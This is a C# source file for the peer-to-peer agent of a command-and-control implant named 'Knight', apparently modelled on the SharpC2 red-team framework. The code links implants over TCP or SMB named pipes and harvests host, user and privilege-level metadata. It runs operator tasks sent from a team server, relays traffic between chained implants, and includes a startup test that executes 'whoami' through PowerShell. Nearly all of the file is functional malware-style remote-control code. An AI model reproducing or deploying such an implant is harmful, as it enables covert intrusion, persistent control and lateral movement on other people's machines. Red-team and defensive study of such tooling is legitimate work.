//-------------------- Test
//#define Egress
//#define P2P_TCP_SERVER
//#define P2P_TCP_CLIENT
//#define P2P_SMB_SERVER
//#define P2P_SMB_CLIENT
//--------------------

#if !Egress

using Knight.Commands;
using Knight.Helpers;
using Knight.Models.Comm;
using Knight.Models.Knight;
using Knight.Models.Raven;
using Knight.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

//Test
using Internal = SharedArsenal.Internal;
//

namespace Knight
{
    public class Knight //P2P
    {
        private KnightMetadata _metadata;
        private AllyCommModule _parentCommModule;
        private readonly CancellationTokenSource _tokenSource = new CancellationTokenSource();
        private static List<KnightCommand> _commands = new List<KnightCommand>();

        private Dictionary<string, AllyCommModule> _allies = new Dictionary<string, AllyCommModule>(); // Children Soldiers        
#if P2P_TCP_SERVER
        public async Task StartAsTcpServer(bool loopback, int localPort)
        {
            // metadata & load commands
            await GenerateMetadata();
            LoadAgentCommands();

            _parentCommModule = new TcpCommModule(loopback, localPort);
            WriteDebug.Good($"Started Tcp {_parentCommModule.ConnectionMode} for {loopback}(loopback):{localPort}");
            await StartAlly();
        }
#elif P2P_TCP_CLIENT
        public async Task StartAsTcpClient(string remoteAddress, int remotePort)
        {
            // metadata & load commands
            await GenerateMetadata();
            LoadAgentCommands();

            _parentCommModule = new TcpCommModule(remoteAddress, remotePort);
            WriteDebug.Good($"Started Tcp {_parentCommModule.ConnectionMode} for {remoteAddress}:{remotePort}");
            await StartAlly();
        }
#elif P2P_SMB_SERVER
        public async Task StartAsSmbServer(string pipename)
        {
            // metadata & load commands
            await GenerateMetadata();
            LoadAgentCommands();

            _parentCommModule = new SmbCommModule(pipename);
            WriteDebug.Good($"Started Smb {_parentCommModule.ConnectionMode} for {pipename}");
            await StartAlly();
        }
#elif P2P_SMB_CLIENT
        public async Task StartAsSmbClient(string hostname, string pipename)
        {
            // metadata & load commands
            await GenerateMetadata();
            LoadAgentCommands();

            _parentCommModule = new SmbCommModule(hostname, pipename);
            WriteDebug.Good($"Started Smb {_parentCommModule.ConnectionMode} for {hostname}:{pipename}");
            await StartAlly();
        }
#endif
        // Start P2P
        private async Task StartAlly() // Connecting to Parent
        {
            _parentCommModule.Init();
            _parentCommModule.RavenRecieved += HandleRavenFromParent;

            // Test
            string a = "whoami";
            Console.WriteLine($"[*] Test for SharedArsenal on startup");
            string result = Internal.Execute.ExecuteCommand(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", a);
            Console.WriteLine($"    Running powershell {a}");
            Console.WriteLine($"    Result {result}");
            //

            // Blocks until done
            WriteDebug.Good("Comm Started");
            await _parentCommModule.Start();
            WriteDebug.Good("Comm Connected");

            // Parent has Connected
            // (SharpC2 sends a checkin ... I have joined the LinkNotification with Checking in)

            await _parentCommModule.Run();
            WriteDebug.Good("Comm Running");
        }

        // Handle Raven From Parent
        private async Task HandleRavenFromParent(Raven raven)
        {
            WriteDebug.Good($"HandleRavenFromParent with SoldierId: {raven.SoldierId}");

            // Check if for this Soldier
            if (!string.IsNullOrWhiteSpace(raven.SoldierId)) // Empty when raven message is HelloChild
            {
                if (!raven.SoldierId.Equals(_metadata.Id))
                {
                    foreach (var ally in _allies.Where(a => a.Value.Alive))
                    {
                        // Send ... will be sent to each child ...
                        WriteDebug.Good($"Sending Raven to Child SoldierId {ally.Key}");
                        await ally.Value.SendRaven(raven);
                    }

                    return;
                }
            }

            // Handle Raven
            switch (raven.Type)
            {
                case RavenType.CHECK_IN:
                    // Do Nothing
                    WriteDebug.Good($"Handling Raven Type: {RavenType.CHECK_IN}");
                    break;

                case RavenType.ALLY_CHECK_IN:
                    WriteDebug.Good($"Handling Raven Type: {RavenType.ALLY_CHECK_IN}");
                    // Do Nothing
                    break;

                case RavenType.HELLO_CHILD:
                    WriteDebug.Good($"Handling Raven Type: {RavenType.HELLO_CHILD}");

                    var helloChildMSg = Crypto.Decode<HelloChildMessage>(raven.Message);
                    await HandleHelloChild(helloChildMSg);

                    break;

                case RavenType.TASK:
                    var taskMsg = Crypto.Decode<TaskMessage>(raven.Message);
                    WriteDebug.Good($"Handling Raven Type: {RavenType.TASK} & cmd: {taskMsg.Command}");

                    await HandleTask(taskMsg);
                    break;

                case RavenType.TASK_RESULT:
                    WriteDebug.Good($"Handling Raven Type: {RavenType.TASK_RESULT}");
                    // Do Nothing
                    break;

                case RavenType.ALLY_REMOVE:
                    WriteDebug.Good($"Handling Raven Type: {RavenType.ALLY_REMOVE}");
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        // Add Child and start Comm (meaning this Soldier got a Task to listen/connect to a P2P Soldier)
        public async Task AddChildAlly(string taskId, AllyCommModule commModule)
        {
            //WriteDebug.Good($"Adding Child Ally with TaskId: {taskId}");
            commModule.Init();
            commModule.RavenRecieved += HandleRavenFromChild;

            // Send Ally Removal msg if comm fails
            commModule.OnException += async () =>
            {
                commModule.Stop();

                var childId = _allies.FirstOrDefault(k => k.Value == commModule).Key;

                var allyRemoveMsg = new AllyRemoveMessage(childId);
                var brokenRaven = new Raven(_metadata.Id, RavenType.ALLY_REMOVE, Crypto.Encode(allyRemoveMsg));

                await _parentCommModule.SendRaven(brokenRaven);
            };

            // Blocks until connected
            await commModule.Start();
            WriteDebug.Good($"Started Child Ally with TaskId: {taskId}");

            // Send Hello Child
            var helloChildMsg = new HelloChildMessage(taskId, _metadata.Id,
                commModule.ConnectionMode == ConnectionMode.SERVER ? AllyDirection.FROM_CHILD : AllyDirection.TO_CHILD);
            // leave SoldierId blank
            var raven = new Raven(string.Empty, RavenType.HELLO_CHILD, Crypto.Encode(helloChildMsg));
            await commModule.SendRaven(raven);

            // Add Child, will replace taskId with childId later
            _allies.Add(taskId, commModule);
            await commModule.Run();
            WriteDebug.Good($"Running Child Ally with TaskId: {taskId}");
        }

        // Handle Raven From Child
        private async Task HandleRavenFromChild(Raven raven)
        {
            WriteDebug.Good($"HandleRavenFromChild with SoldierId: {raven.SoldierId}");

            // If child is checking In, might be our direct child
            if (raven.Type == RavenType.ALLY_CHECK_IN)
            {
                var allyCheckInMsg = Crypto.Decode<AllyCheckInMessage>(raven.Message);

                // Check if we are parent
                if (allyCheckInMsg.ParentId.Equals(_metadata.Id))
                {
                    // Update child in dict
                    if (_allies.TryGetValue(allyCheckInMsg.TaskId, out var commModule))
                    {
                        _allies.Remove(allyCheckInMsg.TaskId);
                        _allies.Add(allyCheckInMsg.Metadata.Id, commModule);
                        //_allies.Add(raven.SoldierId, commModule); // same thing


                        ////////////////////////////////////////// DEBUG
                        //WriteDebug.Good("### TEST ###");
                        //WriteDebug.Good("Sending test Task to Child");
                        //var task = new TaskMessage
                        //{
                        //    TaskId = Guid.NewGuid().ToString(),
                        //    Command = "whoami",
                        //    Arguments = new string[0],
                        //    File = string.Empty,
                        //};
                        //var tempRaven = new Raven(raven.SoldierId, RavenType.TASK, Crypto.Encode(task));
                        //commModule.SendRaven(tempRaven);
                        ////////////////////////////////////////// DEBUG
                    }
                }
            }

            // Forward to TeamServer
            await SendRavenHome(raven);
            //WriteDebug.Dummy("DUMMY: Sending Raven Home");
            //WriteDebug.PrintRaven(raven);
        }


        // Handle Raven Hello Child (From parent to Child so Child can CheckIn)
        private async Task HandleHelloChild(HelloChildMessage msg)
        {
            WriteDebug.Good($"HandleHelloChild with ParentId: {msg.ParentId}");

            var allyCheckInMsg = new AllyCheckInMessage(msg.TaskId, msg.ParentId, msg.Direction, _metadata);
            var raven = new Raven(_metadata.Id, RavenType.ALLY_CHECK_IN, Crypto.Encode(allyCheckInMsg));

            // Send Home
            await SendRavenHome(raven);
        }

        // HandleTasks
        private async Task HandleTasks(IEnumerable<TaskMessage> tasks)
        {
            foreach (TaskMessage task in tasks)
            {
                Console.WriteLine($"HandleTask with command: {task.Command}"); // DEBUG
                //Thread.Sleep(Settings.GetSleepTime());
                HandleTask(task);
            }
        }

        // HandleTask
        private async Task HandleTask(TaskMessage task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

            if (command == null)
            {
                //SendTaskResult(task.Id, "Command not found");
                await SendTaskOutputError(task.TaskId, "Command not found");
                return;
            }

            try // Try Command
            {
                var result = command.Execute(task);
                //SendTaskResult(task.Id, result);
                await SendTaskOutput(task.TaskId, result);

                if (result == "exiting")    // CHANGE TO A RAVEN WITH TYPE EXIT
                {
                    // Sleeping so result is sent before exiting, works but is kinda dumb
                    System.Threading.Thread.Sleep(1000 * 3);
                    //  _commModule.Stop();
                    _parentCommModule.Stop();
                    System.Threading.Thread.Sleep(1000 * 1);
                    //_tokenSource.Cancel();
                    _tokenSource.Cancel();
                }
            }
            catch (Exception ex) // Send back exception
            {
                Console.WriteLine(ex.ToString()); // DEBUG
                //SendTaskResult(task.Id, ex.Message);
                await SendTaskOutputError(task.TaskId, ex.Message);
            }
        }


        /////////////////////////////////////
        private async Task SendTaskOutput(string taskId, string result)
        {
            var taskResultMsg = new TaskResultMessage
            {
                TaskId = taskId,
                Result = result,
                CompletetedAt = DateTime.UtcNow,
            };
            var raven = new Raven(_metadata.Id, RavenType.TASK_RESULT, Crypto.Encode(taskResultMsg));
            await SendRavenHome(raven);
        }

        private async Task SendTaskOutputError(string taskId, string msg)
        {
            var taskResultMsg = new TaskResultMessage
            {
                TaskId = taskId,
                Result = msg,
                CompletetedAt = DateTime.UtcNow,
            };
            var injuredRaven = new Raven(_metadata.Id, RavenType.TASK_RESULT, Crypto.Encode(taskResultMsg));
            await SendRavenHome(injuredRaven);
        }


        // Send Raven to Castle (Parent)
        private async Task SendRavenHome(Raven raven)
        {
            //WriteDebug.Dummy("Sending Raven Home");
            //WriteDebug.PrintRaven(raven);

            WriteDebug.Dummy($"Sending {raven.Type} Raven Home");
            await _parentCommModule.SendRaven(raven);
        }


        // Generate Metadata        
        private async Task GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            string hostname = Dns.GetHostName();
            IPAddress[] addresses = await Dns.GetHostAddressesAsync(hostname);
            string address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).ToString();
            var integrity = Integrity.MEDIUM;

            if (identity.IsSystem)
            {
                integrity = Integrity.SYSTEM;
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = Integrity.HIGH;
            }

            _metadata = new KnightMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Address = address,
                Hostname = hostname,
                Integrity = integrity,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                x64 = IntPtr.Size == 8 ? true : false,
            };

            Console.WriteLine($"---------- SoldierId: {_metadata.Id} Pid: {_metadata.ProcessId}");

            process.Dispose();
            identity.Dispose();
        }

        // Load Commands
        private void LoadAgentCommands()
        {
            var self = System.Reflection.Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes()) // each type will be a class
            {
                if (type.IsSubclassOf(typeof(KnightCommand))) // if a subclass of AgentCommand, instantiate and add to list
                {
                    var instance = (KnightCommand)Activator.CreateInstance(type);
                    instance.Init(this);

                    _commands.Add(instance);
                }
            }
        }
    }
}

#endif